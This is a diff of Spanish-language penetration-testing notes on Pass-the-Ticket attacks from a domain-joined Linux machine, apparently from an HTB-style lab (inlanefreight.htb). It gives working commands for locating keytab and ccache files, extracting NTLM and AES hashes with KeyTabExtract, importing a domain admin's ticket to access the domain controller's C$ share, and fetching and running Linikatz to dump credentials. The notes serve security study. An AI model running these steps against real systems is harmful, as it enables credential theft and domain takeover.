@@ -1,3 +1,5 @@
+# Pass the Ticket en Linux (Máquina Unida al Dominio)
+
 ## Introduccion
 Igual que podemos unir un cliente windows a un dominio AD de microsoft, tambien podemos unir a este tipo de dominios un cliente Linux. En este apartado se ve como realizar un PtT en Linux, obteniendo los tickets y utilizandolos como en un entorno windows.
 
@@ -19,20 +21,25 @@ inlanefreight.htb
 ...
 ```
 
-Si no tenemos el comando realm se puede buscar con `ps` a ver si tenemos corriendo servicios como `sssd` o `winbind` para saber si la maquina esta unida a algun dominio
+Si no tenemos el comando realm se puede buscar con `ps` a ver si tenemos corriendo servicios como `sssd` o `winbind` para saber si la m aquina esta unida a algun dominio
 ```bash
 ps -ef | grep -i "winbind\|sssd"
 ```
 
-## Encontrando ficheros KeyTab
-```
+---
+
+## 🔑 1. Abuso de Archivos KeyTab (.keytab / .kt)
+
+### Encontrando ficheros KeyTab
+```bash
 find / -name *keytab* -ls 2>/dev/null
+find / -name *.kt -ls 2>/dev/null
 ```
 >Para usar un archivo keytab, debemos tener privilegios de lectura y escritura (rw) sobre el archivo.
 
 
 Con crontab. Podemos ver que utiliza `kinit` (que basicamente lo que hace es solicitar un TGT y almacenarlo como ccache)
-```
+```bash
 linux01:~$ crontab -l
 
 # Edit this file to introduce tasks to be run by cron.
@@ -48,24 +55,10 @@ kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.s
 smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
 ```
 
-## Encontrando archivos ccache
-Buscando en variables de entorno y/o en /tmp
-```
-env | grep -i krb5
-KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
-------------
-
-ls -la /tmp
--rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-
-```
-
----
-
-### Abusando de ficheros KeyTab
-#### Utilizar un fickero keytab
+### Utilizar un fichero keytab
+> Fichero keytab puede ser .keytab, .kt
 Listar informacion de un fichero keytab
-```
+```bash
 klist -k -t /opt/specialfiles/carlos.keytab
 
 
@@ -76,7 +69,7 @@ KVNO Timestamp           Principal
 ```
 
 Comprobar que ticket estamos usando
-```
+```bash
 klist
 ```
 
@@ -94,12 +87,12 @@ conectarse a un recurso SMB utilizando el ticket importado:
 smbclient //dc01/carlos -k -c ls
 ```
 
-#### Abusar de un keytab para extraer NTLM hash
+### Abusar de un keytab para extraer NTLM hash
 https://github.com/sosdave/KeyTabExtract
 
 Con el siguiente comando extraemos el ntlm hash, aes256 hash, etc. para asi poder aprovechar a hacer un pass the hash y no solo utilizar el ticket para abusar de su identidad ante un servicio sino para ganar acceso a la maquina.
 
-```
+```bash
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
 
 [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
@@ -111,30 +104,43 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
         NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
         AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
-``` /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
 ```
 
 Podemos ahora crackear con hashcat o mirar en https://crackstation.net/
 
 Login como usuario de dominio en maquina linux tras crackear el hash:
-```
+```bash
 su - carlos@inlanefreight.htb
 ```
 
 Una vez suplantada la identidad podriamos volver a mirar nuevos ficheros keytab y volver a suplantar nuevas identidades o abusar de ellas.
 
-## Abusando ficheros ccache
+---
 
+## 🎟️ 2. Abuso de Archivos ccache
+
+### Encontrando archivos ccache
+Buscando en variables de entorno y/o en /tmp
+```bash
+env | grep -i krb5
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+------------
+
+ls -la /tmp
+-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
+```
+
+### Enumerar privilegios e importar ccache
 Habiendo encontrado ficheros ccache (por ejemplo en /tmp), quizas podamos enumerar a que grupos pertenece algunos de esos usuarios de los ficheros ccache. porque si alguno pertenece a domain admins o a algun grupo interesante podemos ir elevando privilegios poco a poco realizando movimientos laterales.
 
-```
+```bash
 root@linux01:~# id julio@inlanefreight.htb
 
 uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
 ```
 
 Mirando que tickets tenemos importados
-```
+```bash
 klist
 ```
 
@@ -142,7 +148,9 @@ Importar el ccache, declarandolo en la variable
 ```bash 
 # Copiar el fichero a nuestro directorio y exportar la variable con la ruta de ese fichero ccache
 cp /tmp/krb5cc_647401106_I8I133 .
+# depende de la variable puede ser una de las 2 siguientes maneras, lo mejor es primero mirar que nombre tiene la variable que queremos suplantar:
 export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+export KRB5CCNAME=FILE:/tmp/krb5cc_647401109_nulVAE
 
 klist
 
@@ -160,4 +168,25 @@ Probar a conectarse a un SMB utilizando el ccache importado
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
 >klist muestra la información del ticket. Debemos considerar los valores "valid starting" y "expires".
+
+---
+
+## Automatización con LiniKatz
+Cuando tenemos acceso a una máquina Linux unida a un dominio, podemos ejecutar **Linikatz** para tratar de exportar la mayoría de credenciales UNIX posibles, así como tickets Kerberos (`/tmp/krb5cc_*`), archivos keytab, bases de datos y hashes de SSSD (`/var/lib/sss/db/`), secretos de Samba/Winbind y configuraciones de Kerberos.
+
+> [!NOTE]
+> Para mayor efectividad, debemos ser root.
+
+Repositorio: https://github.com/CiscoCXSecurity/linikatz
+
+```bash
+# Descargar Linikatz
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh -O /opt/linikatz.sh
+chmod +x /opt/linikatz.sh
+
+# Ejecutar el volcado
+/opt/linikatz.sh
+```
+
+Al lanzarlo se creará una carpeta `linikatz.<algo>` y se volcará ahí todo el material recopilado. Con los tickets `.ccache` o keytabs extraídos, podemos reutilizarlos exportando `KRB5CCNAME` o con `kinit` tal como se explicó en las secciones anteriores.
 
